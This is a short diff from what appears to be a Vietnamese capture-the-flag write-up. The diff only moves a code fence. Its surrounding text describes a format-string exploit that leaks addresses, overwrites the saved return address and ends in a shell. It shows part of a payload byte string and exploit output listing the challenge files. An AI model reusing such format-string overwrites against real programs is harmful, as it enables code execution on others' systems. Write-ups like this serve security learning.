@@ -203,13 +203,13 @@ b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535312470000
 - sau khi leak được địa chỉ thì đến bước ghi payload, em sẽ có 3 địa chỉ để ghi vào saved-rip, mỗi địa chỉ ghi 3 lần vì thế em cần viết hàm để ghi qua formatstring
 - vì hàm main lặp lại nên có thể ghi nhiều lần tùy ý
 - sau khi ghi xong và thoát khỏi vòng lặp thì em có thể chạy shell
-
+```c
 [*] 0x2563343139383525
 [*] 0x202020206e682436
 [*] this is part 2 of addr 0x7fffffffe620: 0xf7c5
 [*] this is package part 2: 0xe622
 [*] Switching to interactive mode
-```c
+
 Error: failed to decode hex
 $ ls
 Dockerfile    analyzer_patched        analyzer_patched.id2  ld-2.35.so
